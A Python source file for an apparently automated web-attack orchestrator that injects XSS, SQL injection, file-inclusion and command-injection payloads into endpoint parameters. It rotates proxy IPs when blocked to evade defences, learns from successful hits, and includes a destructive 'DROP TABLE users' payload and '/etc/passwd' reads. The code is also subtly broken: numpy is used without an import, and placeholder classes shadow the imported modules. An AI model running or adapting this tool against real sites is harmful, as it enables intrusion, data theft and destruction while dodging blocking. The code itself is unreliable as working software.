import asyncio
import httpx
import logging
from src.anonymity.ip_rotator import IpRotator
from src.hebbian_learning.hebbian_network import HebbianNetwork
from src.hebbian_learning.central_memory import CentralMemory # Assumed exists
from src.hebbian_learning.feedback_interpreter import FeedbackInterpreter # Assumed exists
from src.vulnerabilities.payloads import get_initial_payloads # Assumed exists, categorised by vul_type

logger = logging.getLogger(__name__)

class AttackOrchestrator:
    def __init__(self, ip_rotator: IpRotator, central_memory: CentralMemory):
        self.ip_rotator = ip_rotator
        self.central_memory = central_memory
        self.hebbian_networks = {} # {endpoint_hash: HebbianNetwork instance}
        self.feedback_interpreter = FeedbackInterpreter()
        self.results = [] # Store detected vulnerabilities

    async def _get_client(self):
        proxy = self.ip_rotator.get_current_proxy()
        if proxy:
            return httpx.AsyncClient(proxies={"http://": proxy, "https://": proxy}, follow_redirects=True, timeout=15)
        return httpx.AsyncClient(follow_redirects=True, timeout=15)

    async def _send_request(self, url, method="GET", params=None, data=None, headers=None):
        try:
            async with self._get_client() as client:
                if method.upper() == "GET":
                    response = await client.get(url, params=params, headers=headers)
                elif method.upper() == "POST":
                    response = await client.post(url, data=data, headers=headers)
                else:
                    logger.warning(f"Unsupported method: {method}")
                    return None
                response.raise_for_status()
                return response
        except httpx.HTTPStatusError as e:
            logger.warning(f"HTTP error for {url}: {e.response.status_code} - {e.response.text[:100]}")
            if e.response.status_code in [403, 429, 500]: # Common blocking/error codes
                logger.warning(f"Detected potential block/error for {url}. Rotating IP.")
                await self.ip_rotator.rotate_ip()
            return e.response # Return response even on error for feedback interpretation
        except httpx.RequestError as e:
            logger.error(f"Request error for {url}: {e}")
            await self.ip_rotator.rotate_ip() # Rotate IP on network errors
            return None
        except Exception as e:
            logger.error(f"An unexpected error occurred sending request to {url}: {e}")
            return None

    async def test_endpoint(self, endpoint_details, vulnerability_type, iterations=10):
        url = endpoint_details['url']
        method = endpoint_details['method']
        params = endpoint_details['params'] # List of {'name': 'val', 'type': 'text'}

        # Create a unique hash for the endpoint to manage its dedicated HLN
        endpoint_hash = hash(f"{url}-{method}-{frozenset((p['name'], p['type']) for p in params)}")

        if endpoint_hash not in self.hebbian_networks:
            # Get initial payloads for this vulnerability type from the central knowledge base
            initial_payloads = get_initial_payloads(vulnerability_type)
            if not initial_payloads:
                logger.warning(f"No initial payloads for {vulnerability_type}. Skipping {url}")
                return

            self.hebbian_networks[endpoint_hash] = HebbianNetwork(endpoint_details, initial_payloads)
            logger.info(f"Initialized Hebbian Network for {url} ({vulnerability_type})")
        
        current_hln = self.hebbian_networks[endpoint_hash]
        last_payload = None
        last_feedback = None

        for i in range(iterations):
            payload = current_hln.generate_payload(last_payload, last_feedback)
            
            # Prepare request based on method and payload
            request_params = {}
            request_data = {}
            target_param_name = None

            # Simple heuristic: find a text-based parameter to inject into
            for p in params:
                if p['type'] == 'text': # Prioritize text inputs
                    target_param_name = p['name']
                    break
            if not target_param_name and params: # Fallback to any parameter if no text input found
                target_param_name = params[0]['name']

            if target_param_name:
                if method.upper() == "GET":
                    for p in params:
                        request_params[p['name']] = payload if p['name'] == target_param_name else p.get('value', '')
                    response = await self._send_request(url, method="GET", params=request_params)
                elif method.upper() == "POST":
                    for p in params:
                        request_data[p['name']] = payload if p['name'] == target_param_name else p.get('value', '')
                    response = await self._send_request(url, method="POST", data=request_data)
                else:
                    logger.warning(f"Unsupported method {method} for endpoint {url}. Skipping.")
                    response = None
            else:
                logger.warning(f"No suitable parameter found for injection on {url}. Skipping payload testing.")
                response = None
            
            if response:
                detection_result = self.feedback_interpreter.interpret_response(response, vulnerability_type, payload)
                
                if detection_result['vulnerable']:
                    logger.critical(f"VULNERABILITY DETECTED! Type: {vulnerability_type}, URL: {url}, Payload: {payload}, Proof: {detection_result.get('proof')}")
                    self.results.append({
                        'url': url,
                        'method': method,
                        'vulnerability_type': vulnerability_type,
                        'payload': payload,
                        'criticality': detection_result.get('criticality', 'HIGH'),
                        'proof': detection_result.get('proof', 'N/A'),
                        'explanation': detection_result.get('explanation', 'Detected by HebbScan.'),
                        'recommendations': detection_result.get('recommendations', 'Consult OWASP guidelines for mitigation.')
                    })
                    current_hln.provide_feedback(payload, 1) # Positive feedback
                    last_feedback = "SUCCESS"
                    # Add successful pattern to central memory for cross-learning
                    self.central_memory.add_successful_pattern(vulnerability_type, payload, endpoint_details)
                    break # Stop testing this endpoint if vulnerability found (or continue for more PoCs)
                else:
                    logger.info(f"Payload '{payload}' on {url} - No vulnerability detected. Status: {response.status_code}")
                    current_hln.provide_feedback(payload, -1) # Negative feedback
                    last_feedback = "FAILURE"
            else:
                logger.warning(f"No response received for {url} with payload '{payload}'. Providing neutral feedback.")
                current_hln.provide_feedback(payload, 0) # Neutral feedback
                last_feedback = "NEUTRAL"
            
            last_payload = payload
            await asyncio.sleep(0.5) # Small delay between requests

        logger.info(f"Finished testing {url} for {vulnerability_type} after {iterations} iterations.")

    def get_scan_results(self):
        return self.results
    
    def get_hebbian_network_stats(self):
        stats = {}
        for ep_hash, hln in self.hebbian_networks.items():
            stats[ep_hash] = {
                'url': hln.target_endpoint_context.get('url'),
                'successful_patterns_count': len(hln.get_successful_patterns()),
                'neuron_weights_avg': np.mean([np.mean(n.weights) for n in hln.neurons]) # Example stat
            }
        return stats

# Placeholder classes for dependencies (to make AttackOrchestrator runnable for demo)
class CentralMemory:
    def __init__(self):
        self.successful_patterns = {} # {vuln_type: {payload: [contexts]}}
    
    def add_successful_pattern(self, vuln_type, payload, context):
        if vuln_type not in self.successful_patterns:
            self.successful_patterns[vuln_type] = {}
        if payload not in self.successful_patterns[vuln_type]:
            self.successful_patterns[vuln_type][payload] = []
        self.successful_patterns[vuln_type][payload].append(context)
        logger.info(f"Added successful pattern '{payload}' for {vuln_type} to Central Memory.")

    def get_generalized_patterns(self, vuln_type):
        """Placeholder: In real implementation, this would generalize from stored patterns."""
        return list(self.successful_patterns.get(vuln_type, {}).keys())

class FeedbackInterpreter:
    def interpret_response(self, response, vulnerability_type, payload):
        """
        Placeholder for advanced feedback interpretation.
        In a real scenario, this would analyze response headers, body, timing,
        and compare with a baseline for anomalies specific to the vulnerability type.
        """
        result = {'vulnerable': False, 'proof': 'N/A', 'criticality': 'LOW', 'explanation': 'No direct proof.'}

        if not response:
            return result # No response means no direct feedback on vulnerability

        if response.status_code >= 500: # Server error often indicates backend issue
            result['explanation'] = f"Server responded with {response.status_code} indicating potential backend issue."
            # Look for specific error messages for SQLi, RCE
            if "sql syntax" in response.text.lower() or "mysql" in response.text.lower():
                result['vulnerable'] = True
                result['proof'] = "SQL error message detected."
                result['criticality'] = 'HIGH'
                result['explanation'] = "Potential SQL Injection due to database error message."
            elif "command not found" in response.text.lower() or "permission denied" in response.text.lower():
                result['vulnerable'] = True
                result['proof'] = "Command execution error message detected."
                result['criticality'] = 'CRITICAL'
                result['explanation'] = "Potential RCE due to command execution error."
            # Add more specific checks for other types

        # For XSS: check if payload is reflected in the response body without proper encoding
        if vulnerability_type == 'XSS' and payload in response.text and '<script>' in payload:
            result['vulnerable'] = True
            result['proof'] = f"Payload '{payload}' reflected in response body without encoding."
            result['criticality'] = 'HIGH'
            result['explanation'] = "Cross-Site Scripting (XSS) vulnerability detected."
        
        # For LFI: check for file content reflection
        if vulnerability_type == 'LFI' and "root:" in response.text and "/etc/passwd" in payload:
            result['vulnerable'] = True
            result['proof'] = f"Content of /etc/passwd found in response for payload '{payload}'."
            result['criticality'] = 'HIGH'
            result['explanation'] = "Local File Inclusion (LFI) vulnerability detected."

        # Behavioral anomalies (e.g., unexpected redirect, unusually long response time)
        if response.status_code == 302 and vulnerability_type == 'OpenRedirect':
            result['vulnerable'] = True
            result['criticality'] = 'MEDIUM'
            result['proof'] = f"Unexpected redirect to {response.headers.get('Location')} for payload '{payload}'."
            result['explanation'] = "Open Redirect vulnerability suspected."

        return result

def get_initial_payloads(vulnerability_type):
    """Provides initial payload patterns for a given vulnerability type."""
    payloads = {
        'XSS': [
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "onmouseover='alert(1)'",
            "<a><b onmouseover=alert(1)></b></a>"
        ],
        'SQLi': [
            "' OR 1=1 --",
            "' UNION SELECT 1,2,3--",
            "admin'--",
            "sleep(5)--",
            "\" OR \"a\"=\"a",
            "ORDER BY 1--",
            "'; DROP TABLE users; --",
            "1 AND 1=IF(2>1,SLEEP(5),0)",
            "1' or 1=1 limit 1 #"
        ],
        'LFI': [
            "../../../../etc/passwd",
            "../../../../windows/win.ini",
            "/proc/self/cmdline",
            "file:///etc/passwd"
        ],
        'RCE': [
            "; ls -la",
            "| cat /etc/passwd",
            "$(cat /etc/passwd)",
            "`ls -la`",
            "& ping -c 4 127.0.0.1 &"
        ],
        # Add more types as needed
    }
    return payloads.get(vulnerability_type, ["default_payload_here"]) # Default if type not found

# Example Usage (for testing)
async def test_attack_orchestrator():
    logger.setLevel(logging.DEBUG)
    logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s')

    # Dummy IpRotator for testing
    class DummyIpRotator:
        def get_current_proxy(self): return None
        def get_proxy_type(self): return "Direct"
        async def rotate_ip(self): print("IP rotation triggered.")

    ip_rotator = DummyIpRotator()
    central_memory = CentralMemory()
    orchestrator = AttackOrchestrator(ip_rotator, central_memory)

    # Simulate a discovered endpoint
    demo_endpoint_sqli = {
        'url': 'http://testphp.vulnweb.com/listproducts.php?cat=1', # A known vulnerable site for demo
        'method': 'GET',
        'params': [{'name': 'cat', 'type': 'text', 'value': '1'}]
    }

    demo_endpoint_xss = {
        'url': 'http://testphp.vulnweb.com/search.php',
        'method': 'GET',
        'params': [{'name': 'query', 'type': 'text', 'value': 'test'}]
    }

    print("\n--- Testing SQLi on demo endpoint ---")
    await orchestrator.test_endpoint(demo_endpoint_sqli, 'SQLi', iterations=5)

    print("\n--- Testing XSS on demo endpoint ---")
    await orchestrator.test_endpoint(demo_endpoint_xss, 'XSS', iterations=5)

    print("\n--- Scan Results ---")
    results = orchestrator.get_scan_results()
    if results:
        for res in results:
            print(f"[{res['criticality']}] {res['vulnerability_type']} at {res['url']} with payload: {res['payload']}")
            print(f"Proof: {res['proof']}")
            print(f"Explanation: {res['explanation']}\n")
    else:
        print("No vulnerabilities detected in this simulation.")
    
    print("\n--- Hebbian Network Stats ---")
    hln_stats = orchestrator.get_hebbian_network_stats()
    for ep_hash, stats in hln_stats.items():
        print(f"Endpoint: {stats['url']}")
        print(f"  Successful patterns: {stats['successful_patterns_count']}")
        print(f"  Avg Neuron Weights: {stats['neuron_weights_avg']:.4f}")

if __name__ == "__main__":
    asyncio.run(test_attack_orchestrator())
